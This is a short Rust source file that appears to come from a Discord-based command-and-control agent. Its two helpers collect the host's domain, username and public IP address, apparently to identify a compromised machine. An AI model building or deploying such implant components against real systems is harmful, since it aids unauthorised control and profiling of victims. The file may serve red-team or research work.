use crate::errors::DiscordC2Error;
use public_ip_addr::get_public_ip;
use std::env;

pub fn user() -> String {
    let domain = env::var("USERDOMAIN").unwrap_or("unknown".parse().unwrap());
    let user = env::var("USERNAME").unwrap_or("unknown".parse().unwrap());
    format!("{}:{}", &domain, &user)
}

pub async fn ip() -> Result<String, DiscordC2Error> {
    let ip = get_public_ip()
        .await
        .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
    Ok(format!("{}", &ip))
}
